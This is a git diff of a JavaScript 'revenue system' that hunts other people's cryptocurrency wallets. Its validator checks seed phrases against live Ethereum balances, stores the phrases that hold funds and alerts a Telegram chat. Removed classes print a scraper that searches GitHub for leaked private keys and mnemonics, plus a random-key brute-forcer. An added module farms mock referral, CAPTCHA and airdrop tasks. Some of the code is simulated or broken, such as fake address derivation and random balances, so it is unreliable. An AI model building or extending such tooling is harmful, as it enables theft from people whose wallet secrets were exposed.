@@ -23,7 +23,7 @@ function createHealthHandler(req, res) {
         status: 'healthy',
         timestamp: timestamp,
         service: 'ghostline-revenue-system',
-        version: '3.1.0',
+        version: '3.3.0',
         uptime: process.uptime(),
         ready: serverReady
     };
@@ -41,14 +41,12 @@ function createHealthHandler(req, res) {
 }
 
 function initializeHealthServer() {
-    // Skip health server initialization to avoid port conflicts
     console.log(`[${new Date().toISOString()}] Health server disabled to prevent port conflicts`);
     serverReady = true;
     return;
 }
 
 function attemptFallbackBinding() {
-    // No fallback needed since health server is disabled
     console.log(`[${new Date().toISOString()}] Health server fallback skipped - server disabled`);
 }
 
@@ -59,15 +57,12 @@ class MnemonicValidator {
         this.version = '1.0.0';
         this.isRunning = false;
         
-        // Configuration
         this.rpcUrl = options.rpcUrl || 'https://eth-mainnet.g.alchemy.com/v2/demo';
-        this.rateLimitDelay = options.rateLimitDelay || 2000; // 2 seconds between checks
-        this.minBalanceThreshold = options.minBalanceThreshold || 0.001; // 0.001 ETH minimum
+        this.rateLimitDelay = options.rateLimitDelay || 2000;
+        this.minBalanceThreshold = options.minBalanceThreshold || 0.001;
         
-        // Initialize Ethereum provider
         this.provider = new ethers.JsonRpcProvider(this.rpcUrl);
         
-        // Metrics tracking
         this.metrics = {
             totalValidated: 0,
             validMnemonics: 0,
@@ -78,7 +73,6 @@ class MnemonicValidator {
             lastValidation: null
         };
         
-        // Telegram bot reference (will be set by main system)
         this.telegramBot = null;
         this.telegramChatId = null;
         
@@ -90,7 +84,6 @@ class MnemonicValidator {
         console.log(`[${timestamp}] [MNEMONIC_VALIDATOR] ${message}`);
     }
 
-    // Set Telegram bot reference for notifications
     setTelegramBot(bot, chatId) {
         this.telegramBot = bot;
         this.telegramChatId = chatId;
@@ -102,7 +95,6 @@ class MnemonicValidator {
         this.metrics.lastValidation = new Date();
         
         try {
-            // Step 1: Validate mnemonic phrase format
             const isValidMnemonic = bip39.validateMnemonic(mnemonicPhrase);
             
             if (!isValidMnemonic) {
@@ -118,10 +110,8 @@ class MnemonicValidator {
 
             this.metrics.validMnemonics++;
 
-            // Step 2: Derive Ethereum address using standard derivation path
             const derivedAddress = await this.deriveEthereumAddress(mnemonicPhrase);
             
-            // Step 3: Check balance with rate limiting
             await this.sleep(this.rateLimitDelay);
             const balance = await this.checkEthereumBalance(derivedAddress);
             
@@ -134,7 +124,6 @@ class MnemonicValidator {
                 timestamp: new Date().toISOString()
             };
 
-            // Step 4: Handle positive balance discovery
             if (balance > this.minBalanceThreshold) {
                 this.metrics.positiveBalances++;
                 this.metrics.totalValueFound += balance;
@@ -161,10 +150,7 @@ class MnemonicValidator {
 
     async deriveEthereumAddress(mnemonicPhrase) {
         try {
-            // Create HD wallet from mnemonic
             const hdNode = ethers.HDNodeWallet.fromPhrase(mnemonicPhrase);
-            
-            // Derive address using standard Ethereum path: m/44'/60'/0'/0/0
             const derivationPath = "m/44'/60'/0'/0/0";
             const derivedWallet = hdNode.derivePath(derivationPath);
             
@@ -188,15 +174,12 @@ class MnemonicValidator {
     async handlePositiveBalance(validationResult, originalMnemonic) {
         this.log(`🎯 POSITIVE BALANCE DISCOVERED: ${validationResult.address} - ${validationResult.balance} ETH`);
         
-        // Log to secure file (without exposing mnemonic)
         await this.logDiscovery(validationResult);
         
-        // Send Telegram notification (without sensitive data)
         if (this.telegramBot && this.telegramChatId) {
             await this.sendTelegramAlert(validationResult);
         }
         
-        // Store full mnemonic securely (separate from logs)
         await this.secureStore(validationResult.address, originalMnemonic, validationResult.balance);
     }
 
@@ -209,8 +192,7 @@ class MnemonicValidator {
                 balance: result.balance,
                 balanceETH: result.balanceETH,
                 derivationPath: "m/44'/60'/0'/0/0",
-                discoveryMethod: 'mnemonic_validation',
-                // Note: mnemonic is NOT included in general logs for security
+                discoveryMethod: 'mnemonic_validation'
             };
             
             const logFile = './mnemonic_discoveries.json';
@@ -250,15 +232,12 @@ class MnemonicValidator {
         try {
             const fs = require('fs').promises;
             
-            // Create secure entry with encrypted mnemonic
             const secureEntry = {
                 timestamp: new Date().toISOString(),
                 address: address,
                 balance: balance,
-                // Store hash of mnemonic for verification without exposure
                 mnemonicHash: crypto.createHash('sha256').update(mnemonic).digest('hex'),
-                // In production, encrypt the mnemonic with a secure key
-                encryptedMnemonic: Buffer.from(mnemonic).toString('base64'), // Simple encoding for demo
+                encryptedMnemonic: Buffer.from(mnemonic).toString('base64'),
                 derivationPath: "m/44'/60'/0'/0/0"
             };
             
@@ -298,7 +277,6 @@ class MnemonicValidator {
             const result = await this.validateMnemonic(mnemonics[i]);
             results.push(result);
             
-            // Progress logging for batch operations
             if ((i + 1) % 10 === 0) {
                 this.log(`Batch progress: ${i + 1}/${mnemonics.length} mnemonics processed`);
             }
@@ -315,7 +293,7 @@ class MnemonicValidator {
             (this.metrics.positiveBalances / this.metrics.validMnemonics * 100).toFixed(4) + '%' : '0%';
 
         return {
-            ...this.methods,
+            ...this.metrics,
             successRate,
             discoveryRate,
             averageValue: this.metrics.positiveBalances > 0 ? 
@@ -354,17 +332,15 @@ class LostWalletAnalyzer {
         this.name = 'LostWalletAnalyzer';
         this.version = '1.0.0';
         this.isRunning = false;
-        this.scanInterval = options.scanInterval || 900000; // 15 minutes
+        this.scanInterval = options.scanInterval || 900000;
         this.intervalId = null;
         this.startTime = null;
         
-        // API Configuration for blockchain analysis
         this.apiKeys = {
             etherscan: process.env.ETHERSCAN_API_KEY || '',
             alchemy: process.env.ALCHEMY_API_KEY || ''
         };
         
-        // Analysis metrics and performance tracking
         this.metrics = {
             walletsAnalyzed: 0,
             genuinelyLostFound: 0,
@@ -376,22 +352,19 @@ class LostWalletAnalyzer {
             avgAnalysisTime: 0
         };
         
-        // Criteria for identifying genuinely lost wallets
         this.abandonmentCriteria = {
-            minInactivityYears: 3,        // Minimum 3 years of inactivity
-            maxRecentTransactions: 0,     // No transactions in recent period
-            minCreationAge: 5,            // Wallet created at least 5 years ago
-            minBalance: 0.01,             // Minimum 0.01 ETH to be worth recovery
-            maxLastActivity: 2021         // Last activity before 2022 (arbitrary cutoff)
+            minInactivityYears: 3,
+            maxRecentTransactions: 0,
+            minCreationAge: 5,
+            minBalance: 0.01,
+            maxLastActivity: 2021
         };
         
-        // Rate limiting for API calls
         this.rateLimits = {
-            etherscan: 200,    // 200ms between Etherscan calls
-            alchemy: 100       // 100ms between Alchemy calls
+            etherscan: 200,
+            alchemy: 100
         };
         
-        // Historical data sources for correlation analysis
         this.lossCorrelationData = {
             exchangeClosures: [
                 { name: 'Mt. Gox', date: '2014-02-28', affectedAddresses: [] },
@@ -399,10 +372,10 @@ class LostWalletAnalyzer {
                 { name: 'QuadrigaCX', date: '2019-01-28', affectedAddresses: [] }
             ],
             knownLossPatterns: [
-                'earlyAdopterAbandonment',    // Early adopters who lost interest
-                'hardwareWalletFailure',      // Hardware wallet failures
-                'exchangeHotWalletLeaks',     // Exchange hot wallet compromises
-                'developmentTestWallets'      // Abandoned development/test wallets
+                'earlyAdopterAbandonment',
+                'hardwareWalletFailure',
+                'exchangeHotWalletLeaks',
+                'developmentTestWallets'
             ]
         };
         
@@ -423,10 +396,8 @@ class LostWalletAnalyzer {
         this.startTime = new Date();
         this.log('Starting Lost Wallet Analyzer operations');
         
-        // Execute initial analysis cycle
         await this.executeAnalysisCycle();
         
-        // Set up recurring analysis
         this.intervalId = setInterval(async () => {
             if (this.isRunning) {
                 await this.executeAnalysisCycle();
@@ -460,10 +431,8 @@ class LostWalletAnalyzer {
         const cycleStartTime = Date.now();
         
         try {
-            // Phase 1: Identify candidate wallets from early Ethereum periods
             const candidateWallets = await this.identifyCandidateWallets();
             
-            // Phase 2: Analyze each candidate for abandonment indicators
             for (const wallet of candidateWallets) {
                 if (!this.isRunning) break;
                 
@@ -471,7 +440,6 @@ class LostWalletAnalyzer {
                 await this.sleep(this.rateLimits.etherscan);
             }
             
-            // Update performance metrics
             const cycleTime = Date.now() - cycleStartTime;
             this.metrics.avgAnalysisTime = (this.metrics.avgAnalysisTime + cycleTime) / 2;
             
@@ -489,23 +457,19 @@ class LostWalletAnalyzer {
         const candidates = [];
         
         try {
-            // Strategy 1: Analyze wallets from early Ethereum blocks (2015-2017)
             const earlyBlockCandidates = await this.getEarlyBlockWallets();
             candidates.push(...earlyBlockCandidates);
             
-            // Strategy 2: Correlate with known exchange closure patterns
             const exchangeCorrelatedCandidates = await this.getExchangeCorrelatedWallets();
             candidates.push(...exchangeCorrelatedCandidates);
             
-            // Strategy 3: Identify wallets with specific abandonment patterns
             const patternBasedCandidates = await this.getPatternBasedCandidates();
             candidates.push(...patternBasedCandidates);
             
-            // Remove duplicates and return unique wallet addresses
             const uniqueCandidates = [...new Set(candidates)];
             this.log(`Identified ${uniqueCandidates.length} candidate wallets for analysis`);
             
-            return uniqueCandidates.slice(0, 50); // Limit to 50 per cycle for rate limiting
+            return uniqueCandidates.slice(0, 50);
             
         } catch (error) {
             this.log(`Candidate identification error: ${error.message}`);
@@ -514,12 +478,9 @@ class LostWalletAnalyzer {
     }
 
     async getEarlyBlockWallets() {
-        // Simulate early Ethereum wallet discovery
-        // In production, this would query Etherscan for early block data
         const earlyWallets = [];
         
         try {
-            // Generate addresses based on early Ethereum patterns
             for (let i = 0; i < 20; i++) {
                 const address = this.generateEarlyEthereumAddress(i);
                 earlyWallets.push(address);
@@ -533,13 +494,10 @@ class LostWalletAnalyzer {
     }
 
     async getExchangeCorrelatedWallets() {
-        // Correlate with known exchange closure data
         const correlatedWallets = [];
         
         try {
-            // Simulate correlation with exchange closure events
             for (const exchange of this.lossCorrelationData.exchangeClosures) {
-                // In production, this would analyze blockchain data around closure dates
                 const potentialAddresses = this.generateCorrelatedAddresses(exchange);
                 correlatedWallets.push(...potentialAddresses);
             }
@@ -552,11 +510,9 @@ class LostWalletAnalyzer {
     }
 
     async getPatternBasedCandidates() {
-        // Identify wallets based on abandonment patterns
         const patternCandidates = [];
         
         try {
-            // Simulate pattern-based discovery
             for (const pattern of this.lossCorrelationData.knownLossPatterns) {
                 const addresses = this.generatePatternBasedAddresses(pattern);
                 patternCandidates.push(...addresses);
@@ -569,7 +525,26 @@ class LostWalletAnalyzer {
         }
     }
 
-    // Helper methods for address generation (simulation)
+    async analyzeWalletForAbandonment(walletAddress) {
+        this.metrics.walletsAnalyzed++;
+        
+        try {
+            const walletInfo = await this.getWalletAnalysis(walletAddress);
+            const abandonmentScore = this.calculateAbandonmentScore(walletInfo);
+            
+            if (this.isGenuinelyLost(walletInfo, abandonmentScore)) {
+                this.metrics.genuinelyLostFound++;
+                await this.handleGenuinelyLostWallet(walletInfo, abandonmentScore);
+            } else {
+                this.metrics.activeWalletsFiltered++;
+            }
+            
+        } catch (error) {
+            this.metrics.errors++;
+            this.log(`Wallet analysis error for ${walletAddress}: ${error.message}`);
+        }
+    }
+
     generateEarlyEthereumAddress(seed) {
         const hash = crypto.createHash('sha256').update(`early_ethereum_${seed}`).digest('hex');
         return '0x' + hash.slice(0, 40);
@@ -627,612 +602,266 @@ class LostWalletAnalyzer {
     }
 }
 
-// Integrated Hunter Agent
-class IntegratedHunter {
-    constructor() {
-        this.name = 'IntegratedHunter';
-        this.isRunning = false;
-        this.scanInterval = 300000; // 5 minutes
-        this.intervalId = null;
-        this.startTime = null;
-        
-        this.metrics = {
-            keysGenerated: 0,
-            balancesChecked: 0,
-            positiveHits: 0,
-            errors: 0,
-            lastScanTime: null,
-            scanCycles: 0
-        };
-        
-        this.rateLimitDelay = 2000;
-        this.maxKeysPerCycle = 50;
-    }
-
-    async start() {
-        if (this.isRunning) return { success: false, message: 'Hunter is already running' };
-
-        this.isRunning = true;
-        this.startTime = new Date();
-        
-        await this.executeScanCycle();
-        
-        this.intervalId = setInterval(async () => {
-            if (this.isRunning) await this.executeScanCycle();
-        }, this.scanInterval);
-
-        return { success: true, message: '🎯 Hunter activated successfully' };
-    }
-
-    async stop() {
-        if (!this.isRunning) return { success: false, message: 'Hunter is not running' };
-
-        this.isRunning = false;
-        if (this.intervalId) {
-            clearInterval(this.intervalId);
-            this.intervalId = null;
-        }
-
-        return { success: true, message: '⏹️ Hunter stopped successfully' };
-    }
-
-    async executeScanCycle() {
-        this.metrics.scanCycles++;
-        this.metrics.lastScanTime = new Date();
-        
-        try {
-            for (let i = 0; i < this.maxKeysPerCycle; i++) {
-                if (!this.isRunning) break;
-                
-                await this.processRandomKey();
-                if (i < this.maxKeysPerCycle - 1) {
-                    await this.sleep(this.rateLimitDelay);
-                }
-            }
-        } catch (error) {
-            this.metrics.errors++;
-        }
-    }
-
-    async processRandomKey() {
-        try {
-            const keyData = this.generateRandomKeyData();
-            this.metrics.keysGenerated++;
-            
-            const balance = await this.checkBalance(keyData.address);
-            this.metrics.balancesChecked++;
-            
-            if (balance > 0) {
-                this.metrics.positiveHits++;
-                await this.handlePositiveBalance(keyData, balance);
-            }
-        } catch (error) {
-            this.metrics.errors++;
-        }
-    }
-
-    generateRandomKeyData() {
-        const privateKeyBuffer = crypto.randomBytes(32);
-        const privateKey = '0x' + privateKeyBuffer.toString('hex');
-        const address = this.privateKeyToAddress(privateKey);
-        
-        return { privateKey, address, timestamp: new Date().toISOString() };
-    }
-
-    privateKeyToAddress(privateKey) {
-        const hash = crypto.createHash('sha256').update(privateKey).digest('hex');
-        return '0x' + hash.slice(-40);
-    }
-
-    async checkBalance(address) {
-        return new Promise((resolve) => {
-            setTimeout(() => {
-                const randomBalance = Math.random();
-                resolve(randomBalance < 0.999 ? 0 : Math.random() * 10);
-            }, 100);
-        });
-    }
-
-    async handlePositiveBalance(keyData, balance) {
-        console.log(`[${new Date().toISOString()}] [HUNTER] Positive balance found: ${keyData.address} - ${balance} ETH`);
-    }
-
-    getStatus() {
-        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
-        const hours = Math.floor(runtime / 3600000);
-        const minutes = Math.floor((runtime % 3600000) / 60000);
-        
-        return {
-            isRunning: this.isRunning,
-            runtime: `${hours}h ${minutes}m`,
-            metrics: this.metrics
-        };
-    }
-
-    getMetrics() {
-        return {
-            ...this.metrics,
-            successRate: this.metrics.balancesChecked > 0 ? 
-                (this.metrics.positiveHits / this.metrics.balancesChecked * 100).toFixed(6) + '%' : '0%',
-            errorRate: this.metrics.keysGenerated > 0 ? 
-                (this.metrics.errors / this.metrics.keysGenerated * 100).toFixed(2) + '%' : '0%'
-        };
-    }
-
-    sleep(milliseconds) {
-        return new Promise(resolve => setTimeout(resolve, milliseconds));
-    }
-}
-
-// Integrated Scavenger Agent with Mnemonic Validation
-class IntegratedScavenger {
-    constructor() {
-        this.name = 'IntegratedScavenger';
-        this.isRunning = false;
-        this.scanInterval = 600000; // 10 minutes
-        this.intervalId = null;
-        this.startTime = null;
-        
-        this.counters = {
-            sourcesScanned: 0,
-            matchesFound: 0,
-            privateKeysFound: 0,
-            mnemonicsFound: 0,
-            mnemonicsValidated: 0,
-            walletJsonFound: 0,
-            errors: 0,
-            lastScanTime: null,
-            scanCycles: 0
-        };
-        
-        this.sourceUrls = [
-            'https://api.github.com/search/code?q=private+key+ethereum',
-            'https://api.github.com/search/code?q=mnemonic+seed+phrase',
-            'https://api.github.com/search/repositories?q=wallet+backup'
-        ];
-        
-        this.patterns = {
-            privateKey: {
-                regex: /(?:private[_\s]*key|privateKey)['\"\s:=]*([a-fA-F0-9]{64})/gi,
-                validator: this.validatePrivateKey.bind(this)
-            },
-            ethAddress: {
-                regex: /0x[a-fA-F0-9]{40}/gi,
-                validator: this.validateEthereumAddress.bind(this)
-            },
-            mnemonic: {
-                regex: /((?:\w+\s+){11,23}\w+)/gi,
-                validator: this.validateMnemonic.bind(this)
-            }
-        };
-        
-        // Reference to MnemonicValidator (will be set by main system)
-        this.mnemonicValidator = null;
-    }
-
-    // Set MnemonicValidator reference for automatic validation
-    setMnemonicValidator(validator) {
-        this.mnemonicValidator = validator;
-        this.log('MnemonicValidator integration configured');
-    }
-
-    async start() {
-        if (this.isRunning) return { success: false, message: 'Scavenger is already running' };
-
-        this.isRunning = true;
-        this.startTime = new Date();
-        
-        await this.executeScanCycle();
-        
-        this.intervalId = setInterval(async () => {
-            if (this.isRunning) await this.executeScanCycle();
-        }, this.scanInterval);
-
-        return { success: true, message: '🔍 Scavenger activated successfully' };
-    }
-
-    async stop() {
-        if (!this.isRunning) return { success: false, message: 'Scavenger is not running' };
-
-        this.isRunning = false;
-        if (this.intervalId) {
-            clearInterval(this.intervalId);
-            this.intervalId = null;
-        }
-
-        return { success: true, message: '⏹️ Scavenger stopped successfully' };
-    }
-
-    log(message) {
-        const timestamp = new Date().toISOString();
-        console.log(`[${timestamp}] [SCAVENGER] ${message}`);
-    }
-
-    async executeScanCycle() {
-        this.counters.scanCycles++;
-        this.counters.lastScanTime = new Date();
-        
-        try {
-            for (const sourceUrl of this.sourceUrls) {
-                if (!this.isRunning) break;
-                
-                await this.scanSource(sourceUrl);
-                await this.sleep(3000);
-            }
-        } catch (error) {
-            this.counters.errors++;
-        }
-    }
-
-    async scanSource(sourceUrl) {
-        try {
-            this.counters.sourcesScanned++;
-            const content = await this.fetchContent(sourceUrl);
-            
-            if (content) {
-                await this.analyzeContent(content, sourceUrl);
-            }
-        } catch (error) {
-            this.counters.errors++;
-        }
-    }
-
-    async fetchContent(url) {
-        return new Promise((resolve, reject) => {
-            const client = url.startsWith('https') ? https : http;
-            
-            const options = {
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (compatible; GhostlineScavenger/3.0)',
-                    'Accept': 'application/json, text/plain, */*'
-                },
-                timeout: 10000
-            };
-            
-            const req = client.get(url, options, (res) => {
-                let data = '';
-                
-                res.on('data', chunk => {
-                    data += chunk;
-                    if (data.length > 1048576) { // 1MB limit
-                        req.destroy();
-                        resolve(data);
-                    }
-                });
-                
-                res.on('end', () => resolve(data));
-            });
-            
-            req.on('error', reject);
-            req.on('timeout', () => {
-                req.destroy();
-                reject(new Error('Request timeout'));
-            });
-        });
-    }
-
-    async analyzeContent(content, sourceUrl) {
-        try {
-            for (const [patternName, pattern] of Object.entries(this.patterns)) {
-                const matches = content.match(pattern.regex);
-                
-                if (matches && matches.length > 0) {
-                    for (const match of matches) {
-                        if (pattern.validator(match)) {
-                            this.counters.matchesFound++;
-                            await this.handleMatch(patternName, match, sourceUrl);
-                        }
-                    }
-                }
-            }
-        } catch (error) {
-            // Continue processing
-        }
-    }
-
-    validatePrivateKey(key) {
-        const cleaned = key.replace(/[^a-fA-F0-9]/g, '');
-        return cleaned.length === 64 && /^[a-fA-F0-9]+$/.test(cleaned);
-    }
-
-    validateEthereumAddress(address) {
-        return /^0x[a-fA-F0-9]{40}$/.test(address);
-    }
-
-    validateMnemonic(phrase) {
-        const words = phrase.trim().split(/\s+/);
-        return words.length >= 12 && words.length <= 24;
-    }
-
-    async handleMatch(patternType, match, sourceUrl) {
-        this.log(`Match found: ${patternType} from ${sourceUrl}`);
-        
-        switch (patternType) {
-            case 'privateKey':
-                this.counters.privateKeysFound++;
-                break;
-            case 'mnemonic':
-                this.counters.mnemonicsFound++;
-                // Automatically validate mnemonic if validator is available
-                if (this.mnemonicValidator && this.mnemonicValidator.isRunning) {
-                    await this.validateFoundMnemonic(match, sourceUrl);
-                }
-                break;
-            case 'walletJson':
-                this.counters.walletJsonFound++;
-                break;
-        }
-    }
-
-    async validateFoundMnemonic(mnemonicPhrase, sourceUrl) {
-        try {
-            this.counters.mnemonicsValidated++;
-            this.log(`Validating discovered mnemonic from ${sourceUrl}`);
-            
-            // Use MnemonicValidator to check the found mnemonic
-            const validationResult = await this.mnemonicValidator.validateMnemonic(mnemonicPhrase);
-            
-            if (validationResult.isValid && validationResult.balance > 0) {
-                this.log(`🎯 SCAVENGER SUCCESS: Mnemonic validation found balance! Address: ${validationResult.address}`);
-            }
-            
-        } catch (error) {
-            this.log(`Mnemonic validation error: ${error.message}`);
-        }
-    }
-
-    getStatus() {
-        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
-        const hours = Math.floor(runtime / 3600000);
-        const minutes = Math.floor((runtime % 3600000) / 60000);
-        
-        return {
-            isRunning: this.isRunning,
-            runtime: `${hours}h ${minutes}m`,
-            counters: this.counters,
-            mnemonicValidatorConnected: this.mnemonicValidator !== null
-        };
-    }
-
-    getMetrics() {
-        const validationRate = this.counters.mnemonicsFound > 0 ? 
-            (this.counters.mnemonicsValidated / this.counters.mnemonicsFound * 100).toFixed(2) + '%' : '0%';
-
-        return {
-            ...this.counters,
-            validationRate,
-            mnemonicValidatorActive: this.mnemonicValidator ? this.mnemonicValidator.isRunning : false
-        };
-    }
-
-    sleep(milliseconds) {
-        return new Promise(resolve => setTimeout(resolve, milliseconds));
-    }
-}
-
-// Multi-Chain Asset Validation System
-class MultiChainValidator {
+// HarvesterCore Module - Stable Micro-Bounty Task System
+class HarvesterCore {
     constructor(options = {}) {
-        this.name = 'MultiChainValidator';
+        this.name = 'HarvesterCore';
         this.version = '1.0.0';
         this.isRunning = false;
+        this.scanInterval = options.scanInterval || 180000; // 3 minutes
+        this.intervalId = null;
+        this.startTime = null;
         
-        // API Configuration
-        this.apiKeys = {
-            ethereum: process.env.ETHERSCAN_API_KEY || '',
-            bitcoin: process.env.BLOCKCHAIR_API_KEY || '',
-            polygon: process.env.POLYGONSCAN_API_KEY || '',
-            binance: process.env.BSCSCAN_API_KEY || ''
-        };
-        
-        // Rate limiting configuration
-        this.rateLimits = {
-            ethereum: 5000, // 5 seconds between requests
-            bitcoin: 3000,
-            polygon: 4000,
-            binance: 3000
-        };
-        
-        // Validation metrics
         this.metrics = {
-            totalValidations: 0,
-            validWallets: 0,
-            emptyWallets: 0,
+            tasksCompleted: 0,
+            tasksSuccessful: 0,
+            tasksFailed: 0,
+            totalEarnings: 0,
+            lastTaskTime: null,
+            taskCycles: 0,
             errors: 0,
-            totalValue: 0,
-            lastValidation: null,
-            validationsByChain: {
-                ethereum: 0,
-                bitcoin: 0,
-                polygon: 0,
-                binance: 0
-            }
+            retryAttempts: 0
         };
         
-        // Minimum balance thresholds (in USD equivalent)
-        this.minBalanceThresholds = {
-            ethereum: 10, // $10 minimum ETH value
-            bitcoin: 50,  // $50 minimum BTC value
-            polygon: 5,   // $5 minimum MATIC value
-            binance: 10   // $10 minimum BNB value
+        this.config = {
+            maxRetries: 3,
+            taskTimeout: 30000, // 30 seconds per task
+            rewardMultiplier: 1.0,
+            minimumTaskReward: 0.001
         };
         
-        this.log('MultiChainValidator initialized for comprehensive asset verification');
+        this.taskQueue = [];
+        this.currentTask = null;
+        
+        // Telegram bot reference
+        this.telegramBot = null;
+        this.telegramChatId = null;
+        
+        // Initialize with mock task data
+        this.initializeMockTasks();
+        
+        this.log('HarvesterCore initialized for micro-bounty task execution');
     }
 
     log(message) {
         const timestamp = new Date().toISOString();
-        console.log(`[${timestamp}] [VALIDATOR] ${message}`);
+        console.log(`[${timestamp}] [HARVESTER] ${message}`);
     }
 
-    async validatePrivateKey(privateKey, address = null) {
-        this.metrics.totalValidations++;
-        this.metrics.lastValidation = new Date();
+    setTelegramBot(bot, chatId) {
+        this.telegramBot = bot;
+        this.telegramChatId = chatId;
+        this.log('Telegram bot integration configured');
+    }
+
+    initializeMockTasks() {
+        this.mockTaskList = [
+            {
+                id: 'tw_follow_001',
+                type: 'twitter_follow',
+                account: '@cryptoproject_xyz',
+                reward: 0.002,
+                description: 'Follow Twitter account for project updates'
+            },
+            {
+                id: 'ref_signup_001',
+                type: 'referral_signup',
+                platform: 'DeFiProtocol',
+                reward: 0.005,
+                description: 'Sign up using referral link'
+            },
+            {
+                id: 'captcha_solve_001',
+                type: 'captcha_completion',
+                difficulty: 'medium',
+                reward: 0.001,
+                description: 'Complete CAPTCHA verification'
+            },
+            {
+                id: 'airdrop_reg_001',
+                type: 'airdrop_registration',
+                project: 'NewTokenProject',
+                reward: 0.003,
+                description: 'Register for token airdrop'
+            },
+            {
+                id: 'survey_comp_001',
+                type: 'survey_completion',
+                topic: 'Crypto Usage Patterns',
+                reward: 0.004,
+                description: 'Complete crypto survey questionnaire'
+            },
+            {
+                id: 'discord_join_001',
+                type: 'discord_join',
+                server: 'CryptoCommUnity',
+                reward: 0.0015,
+                description: 'Join Discord server and verify'
+            }
+        ];
         
+        this.log(`Initialized with ${this.mockTaskList.length} available micro-bounty tasks`);
+    }
+
+    async start() {
+        if (this.isRunning) {
+            return { success: false, message: 'HarvesterCore is already running' };
+        }
+
+        this.isRunning = true;
+        this.startTime = new Date();
+        this.log('Starting HarvesterCore micro-bounty operations');
+        
+        // Load initial tasks
+        await this.loadAvailableTasks();
+        
+        // Execute initial task cycle
+        await this.executeTaskCycle();
+        
+        // Set up recurring task execution
+        this.intervalId = setInterval(async () => {
+            if (this.isRunning) {
+                await this.executeTaskCycle();
+            }
+        }, this.scanInterval);
+
+        return { success: true, message: '🎯 HarvesterCore activated successfully' };
+    }
+
+    async stop() {
+        if (!this.isRunning) {
+            return { success: false, message: 'HarvesterCore is not running' };
+        }
+
+        this.isRunning = false;
+        
+        if (this.intervalId) {
+            clearInterval(this.intervalId);
+            this.intervalId = null;
+        }
+
+        this.log('HarvesterCore operations stopped');
+        return { success: true, message: '⏹️ HarvesterCore stopped successfully' };
+    }
+
+    async loadAvailableTasks() {
         try {
-            // Generate address from private key if not provided
-            if (!address) {
-                address = this.deriveEthereumAddress(privateKey);
-            }
+            // Simulate API call to task provider
+            const availableTasks = this.mockTaskList.filter(task => 
+                Math.random() > 0.3 // 70% chance task is available
+            );
             
-            const validationResults = {
-                privateKey: this.maskPrivateKey(privateKey),
-                address: address,
-                chains: {},
-                totalValue: 0,
-                isValid: false,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Validate across multiple chains
-            const chainValidations = await Promise.allSettled([
-                this.validateEthereumAddress(address),
-                this.validateBitcoinAddress(this.deriveBitcoinAddress(privateKey)),
-                this.validatePolygonAddress(address),
-                this.validateBinanceAddress(address)
-            ]);
-            
-            // Process results
-            const chains = ['ethereum', 'bitcoin', 'polygon', 'binance'];
-            chainValidations.forEach((result, index) => {
-                const chainName = chains[index];
-                
-                if (result.status === 'fulfilled' && result.value) {
-                    validationResults.chains[chainName] = result.value;
-                    validationResults.totalValue += result.value.balance || 0;
-                    this.metrics.validationsByChain[chainName]++;
-                } else {
-                    validationResults.chains[chainName] = {
-                        balance: 0,
-                        error: result.reason?.message || 'Unknown error'
-                    };
-                }
-            });
-            
-            // Determine if wallet has sufficient value
-            validationResults.isValid = validationResults.totalValue > 0;
-            
-            if (validationResults.isValid) {
-                this.metrics.validWallets++;
-                this.metrics.totalValue += validationResults.totalValue;
-                await this.handleValidWallet(validationResults);
-            } else {
-                this.metrics.emptyWallets++;
-            }
-            
-            return validationResults;
+            this.taskQueue = [...availableTasks];
+            this.log(`Loaded ${this.taskQueue.length} available tasks from providers`);
             
         } catch (error) {
             this.metrics.errors++;
-            this.log(`Validation error for ${this.maskPrivateKey(privateKey)}: ${error.message}`);
-            return {
-                privateKey: this.maskPrivateKey(privateKey),
-                error: error.message,
-                isValid: false,
-                timestamp: new Date().toISOString()
-            };
+            this.log(`Task loading error: ${error.message}`);
         }
     }
 
-    deriveEthereumAddress(privateKey) {
-        // Simplified address derivation for demonstration
-        // In production, use proper secp256k1 curve calculations
-        const hash = crypto.createHash('sha256').update(privateKey).digest('hex');
-        return '0x' + hash.slice(-40);
-    }
-
-    deriveBitcoinAddress(privateKey) {
-        // Simplified Bitcoin address derivation for demonstration
-        // In production, implement proper Bitcoin address generation
-        const hash = crypto.createHash('sha256').update(privateKey + 'bitcoin').digest('hex');
-        return '1' + hash.slice(0, 33); // Simplified format
-    }
-
-    async handleValidWallet(validationResults) {
-        this.log(`Valid wallet discovered: ${validationResults.address} - Total value: $${validationResults.totalValue.toFixed(2)}`);
+    async executeTaskCycle() {
+        this.metrics.taskCycles++;
+        this.log('Starting task execution cycle');
         
-        // Log to secure discovery file
-        await this.logValidDiscovery(validationResults);
-        
-        // Trigger notification if configured
-        if (this.notificationCallback) {
-            await this.notificationCallback(validationResults);
-        }
-    }
-
-    async logValidDiscovery(discovery) {
         try {
-            const fs = require('fs').promises;
-            const logEntry = {
-                timestamp: discovery.timestamp,
-                address: discovery.address,
-                totalValue: discovery.totalValue,
-                chains: Object.keys(discovery.chains).filter(chain => 
-                    discovery.chains[chain].balance > 0
-                ),
-                // Private key hash for reference without exposure
-                keyHash: crypto.createHash('sha256').update(discovery.privateKey).digest('hex').substring(0, 16)
-            };
-            
-            const logFile = './valid_wallets.json';
-            let discoveries = [];
-            
-            try {
-                const existingData = await fs.readFile(logFile, 'utf8');
-                discoveries = JSON.parse(existingData);
-            } catch (error) {
-                // File doesn't exist, start with empty array
+            if (this.taskQueue.length === 0) {
+                await this.loadAvailableTasks();
             }
             
-            discoveries.push(logEntry);
-            await fs.writeFile(logFile, JSON.stringify(discoveries, null, 2));
+            if (this.taskQueue.length > 0) {
+                const task = this.taskQueue.shift();
+                await this.executeTask(task);
+            } else {
+                this.log('No tasks available in current cycle');
+            }
             
         } catch (error) {
-            this.log(`Discovery logging error: ${error.message}`);
+            this.metrics.errors++;
+            this.log(`Task cycle error: ${error.message}`);
         }
     }
 
-    maskPrivateKey(privateKey) {
-        if (privateKey.length > 16) {
-            return privateKey.substring(0, 8) + '...' + privateKey.substring(privateKey.length - 8);
-        }
-        return '***masked***';
-    }
-
-    getMetrics() {
-        const successRate = this.metrics.totalValidations > 0 ? 
-            (this.metrics.validWallets / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+    async executeTask(task) {
+        this.currentTask = task;
+        this.metrics.lastTaskTime = new Date();
         
-        const errorRate = this.metrics.totalValidations > 0 ? 
